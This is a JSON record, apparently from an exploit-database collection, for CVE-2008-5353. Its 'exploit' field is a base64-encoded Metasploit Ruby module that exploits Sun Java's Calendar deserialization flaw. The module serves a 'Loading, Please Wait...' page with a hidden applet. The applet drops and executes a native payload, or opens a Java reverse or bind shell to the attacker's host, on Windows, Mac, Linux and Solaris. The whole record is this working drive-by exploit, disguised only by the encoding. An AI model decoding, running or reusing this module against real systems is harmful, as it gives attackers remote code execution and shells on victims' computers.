{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBqYXZhX2NhbGVuZGFyX2Rlc2VyaWFsaXplLnJiIDEwMzg5IDIwMTAtMDktMjAgMDQ6Mzg6MTNaIGpkdWNrICQNCiMjDQoNCiMjDQojIFRoaXMgZmlsZSBpcyBwYXJ0IG9mIHRoZSBNZXRhc3Bsb2l0IEZyYW1ld29yayBhbmQgbWF5IGJlIHN1YmplY3QgdG8NCiMgcmVkaXN0cmlidXRpb24gYW5kIGNvbW1lcmNpYWwgcmVzdHJpY3Rpb25zLiBQbGVhc2Ugc2VlIHRoZSBNZXRhc3Bsb2l0DQojIEZyYW1ld29yayB3ZWIgc2l0ZSBmb3IgbW9yZSBpbmZvcm1hdGlvbiBvbiBsaWNlbnNpbmcgYW5kIHRlcm1zIG9mIHVzZS4NCiMgaHR0cDovL21ldGFzcGxvaXQuY29tL2ZyYW1ld29yay8NCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4Jw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoJUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBTZXJ2ZXI6OkhUTUwNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpCcm93c2VyQXV0b3B3bg0KCWF1dG9wd25faW5mbyh7IDpqYXZhc2NyaXB0ID0+IGZhbHNlIH0pDQoNCglkZWYgaW5pdGlhbGl6ZSggaW5mbyA9IHt9ICkNCg0KCQlzdXBlciggdXBkYXRlX2luZm8oIGluZm8sDQoJCQknTmFtZScgICAgICAgICAgPT4gJ1N1biBKYXZhIENhbGVuZGFyIERlc2VyaWFsaXphdGlvbiBFeHBsb2l0JywNCgkJCSdEZXNjcmlwdGlvbicgICA9PiAlcXsNCgkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhIGZsYXcgaW4gdGhlIGRlc2VyaWFsaXphdGlvbiBvZiBDYWxlbmRhciBvYmplY3RzIGluIHRoZSBTdW4gSlZNLg0KDQoJCQkJVGhlIHBheWxvYWQgY2FuIGJlIGVpdGhlciBhIG5hdGl2ZSBwYXlsb2FkIHdoaWNoIGlzIGdlbmVyYXRlZCBhcyBhbiBleGVjdXRhYmxlIGFuZA0KCQkJCWRyb3BwZWQvZXhlY3V0ZWQgb24gdGhlIHRhcmdldCBvciBhIHNoZWxsIGZyb20gd2l0aGluIHRoZSBKYXZhIGFwcGxldCBpbiB0aGUgdGFyZ2V0IGJyb3dzZXIuDQoNCgkJCQlUaGUgYWZmZWN0ZWQgSmF2YSB2ZXJzaW9ucyBhcmUgSkRLIGFuZCBKUkUgNiBVcGRhdGUgMTAgYW5kIGVhcmxpZXIsIEpESyBhbmQgSlJFIDUuMCBVcGRhdGUgMTYNCgkJCQlhbmQgZWFybGllciwgU0RLIGFuZCBKUkUgMS40LjJfMTggYW5kIGVhcmxpZXIgKFNESyBhbmQgSlJFIDEuMy4xIGFyZSBub3QgYWZmZWN0ZWQpLg0KCQkJfSwNCgkJCSdMaWNlbnNlJyAgICAgICA9PiBNU0ZfTElDRU5TRSwNCgkJCSdBdXRob3InICAgICAgICA9PiBbICdzZicsICdoZG0nIF0sDQoJCQknVmVyc2lvbicgICAgICAgPT4gJyRSZXZpc2lvbjogMTAzODkgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgPT4NCgkJCVsNCgkJCQlbICdDVkUnLCAnMjAwOC01MzUzJyBdLA0KCQkJCVsgJ09TVkRCJywgJzUwNTAwJ10sDQoJCQkJWyAnVVJMJywgJ2h0dHA6Ly9zbGlnaHRseXJhbmRvbWJyb2tlbnRob3VnaHRzLmJsb2dzcG90LmNvbS8yMDA4LzEyL2NhbGVuZGFyLWJ1Zy5odG1sJyBdLA0KCQkJCVsgJ1VSTCcsICdodHRwOi8vbGFuZG9uZi5iaWtlbW9ua2V5Lm9yZy9jb2RlL21hY29zeC9DVkUtMjAwOC01MzUzLjIwMDkwNTE5Lmh0bWwnIF0sDQoJCQkJWyAnVVJMJywgJ2h0dHA6Ly9ibG9nLmNyMC5vcmcvMjAwOS8wNS93cml0ZS1vbmNlLW93bi1ldmVyeW9uZS5odG1sJyBdLA0KCQkJCVsgJ1VSTCcsICdodHRwOi8vc3Vuc29sdmUuc3VuLmNvbS9zZWFyY2gvZG9jdW1lbnQuZG8/YXNzZXRrZXk9MS0yNi0yNDQ5OTEtMScgXQ0KCQkJXSwNCgkJCSdQbGF0Zm9ybScgICAgICA9PiBbICd3aW4nLCAnb3N4JywgJ2xpbnV4JywgJ3NvbGFyaXMnIF0sDQoJCQknUGF5bG9hZCcgICAgICAgPT4geyAnU3BhY2UnID0+IDIwNDgwLCAnQmFkQ2hhcnMnID0+ICcnLCAnRGlzYWJsZU5vcHMnID0+IHRydWUgfSwNCgkJCSdUYXJnZXRzJyAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnR2VuZXJpYyAoSmF2YSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiBbJ2phdmEnXSwNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9KQVZBLA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdXaW5kb3dzIHg4NiAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICd3aW4nLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnTWFjIE9TIFggUFBDIChOYXRpdmUgUGF5bG9hZCknLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfUFBDLA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdNYWMgT1MgWCB4ODYgKE5hdGl2ZSBQYXlsb2FkKScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnb3N4JywNCgkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJCVsgJ0xpbnV4IHg4NiAoTmF0aXZlIFBheWxvYWQpJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICdsaW51eCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdEZWMgMDMgMjAwOCcNCgkJCSkpDQoJZW5kDQoNCg0KCWRlZiBleHBsb2l0DQoJCSMgbG9hZCB0aGUgc3RhdGljIGphciBmaWxlDQoJCXBhdGggPSBGaWxlLmpvaW4oIE1zZjo6Q29uZmlnLmluc3RhbGxfcm9vdCwgImRhdGEiLCAiZXhwbG9pdHMiLCAiQ1ZFLTIwMDgtNTM1My5qYXIiICkNCgkJZmQgPSBGaWxlLm9wZW4oIHBhdGgsICJyYiIgKQ0KCQlAamFyX2RhdGEgPSBmZC5yZWFkKGZkLnN0YXQuc2l6ZSkNCgkJZmQuY2xvc2UNCg0KCQlzdXBlcg0KCWVuZA0KDQoNCglkZWYgb25fcmVxdWVzdF91cmkoIGNsaSwgcmVxdWVzdCApDQoJCWRhdGEgPSBuaWwNCgkJaG9zdCA9IG5pbA0KCQlwb3J0ID0gbmlsDQoNCgkJaWYgbm90IHJlcXVlc3QudXJpLm1hdGNoKC9cLmphciQvaSkNCgkJCWlmIG5vdCByZXF1ZXN0LnVyaS5tYXRjaCgvXC8kLykNCgkJCQlzZW5kX3JlZGlyZWN0KCBjbGksIGdldF9yZXNvdXJjZSgpICsgJy8nLCAnJykNCgkJCQlyZXR1cm4NCgkJCWVuZA0KDQoJCQlwcmludF9zdGF0dXMoICJIYW5kbGluZyByZXF1ZXN0IGZyb20gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIgKQ0KDQoJCQlwYXlsb2FkID0gcmVnZW5lcmF0ZV9wYXlsb2FkKCBjbGkgKQ0KCQkJaWYgbm90IHBheWxvYWQNCgkJCQlwcmludF9lcnJvciggIkZhaWxlZCB0byBnZW5lcmF0ZSB0aGUgcGF5bG9hZC4iICkNCgkJCQlyZXR1cm4NCgkJCWVuZA0KDQoJCQlpZiB0YXJnZXQubmFtZSA9PSAnR2VuZXJpYyAoSmF2YSBQYXlsb2FkKScNCgkJCQlpZiBkYXRhc3RvcmVbJ0xIT1NUJ10NCgkJCQkJamFyICA9IHBheWxvYWQuZW5jb2RlZA0KCQkJCQlob3N0ID0gZGF0YXN0b3JlWydMSE9TVCddDQoJCQkJCXBvcnQgPSBkYXRhc3RvcmVbJ0xQT1JUJ10NCgkJCQkJcHJpbnRfc3RhdHVzKCAiUGF5bG9hZCB3aWxsIGJlIGEgSmF2YSByZXZlcnNlIHNoZWxsIHRvICN7aG9zdH06I3twb3J0fSBmcm9tICN7Y2xpLnBlZXJob3N0fS4uLiIgKQ0KCQkJCWVsc2UNCgkJCQkJcG9ydCA9IGRhdGFzdG9yZVsnTFBPUlQnXQ0KCQkJCQlkYXRhc3RvcmVbJ1JIT1NUJ10gPSBjbGkucGVlcmhvc3QNCgkJCQkJcHJpbnRfc3RhdHVzKCAiUGF5bG9hZCB3aWxsIGJlIGEgSmF2YSBiaW5kIHNoZWxsIG9uICN7Y2xpLnBlZXJob3N0fToje3BvcnR9Li4uIiApDQoJCQkJZW5kDQoJCQkJaWYgamFyDQoJCQkJCXByaW50X3N0YXR1cyggIkdlbmVyYXRlZCBqYXIgdG8gZHJvcCAoI3tqYXIubGVuZ3RofSBieXRlcykuIiApDQoJCQkJCWphciA9IFJleDo6VGV4dC50b19oZXgoIGphciwgcHJlZml4PSIiICkNCgkJCQllbHNlDQoJCQkJCXByaW50X2Vycm9yKCAiRmFpbGVkIHRvIGdlbmVyYXRlIHRoZSBleGVjdXRhYmxlLiIgKQ0KCQkJCQlyZXR1cm4NCgkJCQllbmQNCgkJCWVsc2UNCg0KCQkJCSMgTk9URTogVGhlIEVYRSBtaXhpbiBhdXRvbWFnaWNhbGx5IGhhbmRsZXMgZGV0ZWN0aW9uIG9mIGFyY2gvcGxhdGZvcm0NCgkJCQlkYXRhID0gZ2VuZXJhdGVfcGF5bG9hZF9leGUNCg0KCQkJCWlmIGRhdGENCgkJCQkJcHJpbnRfc3RhdHVzKCAiR2VuZXJhdGVkIGV4ZWN1dGFibGUgdG8gZHJvcCAoI3tkYXRhLmxlbmd0aH0gYnl0ZXMpLiIgKQ0KCQkJCQlkYXRhID0gUmV4OjpUZXh0LnRvX2hleCggZGF0YSwgcHJlZml4PSIiICkNCgkJCQllbHNlDQoJCQkJCXByaW50X2Vycm9yKCAiRmFpbGVkIHRvIGdlbmVyYXRlIHRoZSBleGVjdXRhYmxlLiIgKQ0KCQkJCQlyZXR1cm4NCgkJCQllbmQNCg0KCQkJZW5kDQoNCgkJCXNlbmRfcmVzcG9uc2VfaHRtbCggY2xpLCBnZW5lcmF0ZV9odG1sKCBkYXRhLCBqYXIsIGhvc3QsIHBvcnQgKSwgeyAnQ29udGVudC1UeXBlJyA9PiAndGV4dC9odG1sJyB9ICkNCgkJCXJldHVybg0KCQllbmQNCg0KCQlwcmludF9zdGF0dXMoICIje3NlbGYubmFtZX0gc2VuZGluZyBBcHBsZXQuamFyIHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iICkNCgkJc2VuZF9yZXNwb25zZSggY2xpLCBnZW5lcmF0ZV9qYXIoKSwgeyAnQ29udGVudC1UeXBlJyA9PiAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIiB9ICkNCg0KCQloYW5kbGVyKCBjbGkgKQ0KCWVuZA0KDQoJZGVmIGdlbmVyYXRlX2h0bWwoIGRhdGEsIGphciwgaG9zdCwgcG9ydCApDQoJCWh0bWwgID0gIjxodG1sPjxoZWFkPjx0aXRsZT5Mb2FkaW5nLCBQbGVhc2UgV2FpdC4uLjwvdGl0bGU+PC9oZWFkPiINCgkJaHRtbCArPSAiPGJvZHk+PGNlbnRlcj48cD5Mb2FkaW5nLCBQbGVhc2UgV2FpdC4uLjwvcD48L2NlbnRlcj4iDQoJCWh0bWwgKz0gIjxhcHBsZXQgYXJjaGl2ZT1cIkFwcGxldC5qYXJcIiBjb2RlPVwibXNmLnguQXBwbGV0WC5jbGFzc1wiIHdpZHRoPVwiMVwiIGhlaWdodD1cIjFcIj4iDQoJCWh0bWwgKz0gIjxwYXJhbSBuYW1lPVwiZGF0YVwiIHZhbHVlPVwiI3tkYXRhfVwiLz4iIGlmIGRhdGENCgkJaHRtbCArPSAiPHBhcmFtIG5hbWU9XCJqYXJcIiB2YWx1ZT1cIiN7amFyfVwiLz4iIGlmIGphcg0KCQlodG1sICs9ICI8cGFyYW0gbmFtZT1cImxob3N0XCIgdmFsdWU9XCIje2hvc3R9XCIvPiIgaWYgaG9zdA0KCQlodG1sICs9ICI8cGFyYW0gbmFtZT1cImxwb3J0XCIgdmFsdWU9XCIje3BvcnR9XCIvPiIgaWYgcG9ydA0KCQlodG1sICs9ICI8L2FwcGxldD48L2JvZHk+PC9odG1sPiINCgkJcmV0dXJuIGh0bWwNCgllbmQNCg0KCWRlZiBnZW5lcmF0ZV9qYXIoKQ0KCQlyZXR1cm4gQGphcl9kYXRhDQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/multiple/remote/16293.rb", 
    "id": "16293", 
    "cves": [
        "CVE-2008-5353"
    ]
}